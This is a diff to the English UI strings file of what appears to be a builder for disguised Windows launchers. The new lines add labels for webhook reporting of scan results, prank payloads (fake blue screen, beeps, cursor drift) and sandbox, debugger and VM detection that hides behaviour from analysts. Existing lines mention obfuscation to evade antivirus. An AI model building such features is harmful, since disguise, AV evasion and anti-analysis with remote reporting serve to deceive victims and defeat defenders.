@@ -20,6 +20,8 @@
     "sec_disguise": "Disguise Settings",
     "sec_meta": "Metadata Settings (PE Info)",
     "sec_security": "Security Options",
+    "sec_webhook": "Webhook Tracking",
+    "sec_payloads": "Prank Payloads (Optional)",
     
     "lbl_template": "Select Template:",
     "lbl_select_template": "--- Select Template ---",
@@ -47,6 +49,23 @@
     "chk_obfuscation": "Enable Code Obfuscation (Randomize vars + junk code to evade AV)",
     "chk_signing": "Enable Code Signing (Optional, requires local SignTool and a PFX certificate)",
     "msg_signing_hint": "Note: The signing password is used only for the current build and is not saved to history.",
+    
+    "chk_webhook": "Enable Webhook Reporting (Push Launcher results to your notification channel)",
+    "lbl_webhook_type": "Push Service Type:",
+    "lbl_webhook_type_hint": "(ServerChan / DingTalk / Feishu / Custom JSON)",
+    "lbl_webhook_url": "Webhook URL:",
+    "msg_webhook_hint": "Note: Launcher sends results asynchronously after scanning, without blocking main flow.",
+    
+    "chk_bsod": "Fake BSOD — Show a realistic Windows blue screen when target not found",
+    "chk_audio": "Prank Audio — Play beep sequences in background",
+    "lbl_audio_melody": "Sound Type:",
+    "chk_mouse_drift": "Mouse Drift — Make the cursor wander briefly",
+    "lbl_drift_intensity": "Drift Intensity (1-10):",
+    "lbl_drift_duration": "Duration (seconds):",
+    
+    "sec_anti_analysis": "Anti-Analysis Detection",
+    "chk_anti_analysis": "Enable Anti-Analysis — Detect sandbox/debugger/VM, show benign behavior and exit if detected",
+    "msg_anti_analysis_hint": "Checks: CPU cores / RAM / disk / uptime / MAC prefix / debugger / analysis tools (11 indicators)",
     
     "btn_browse": "Browse",
     
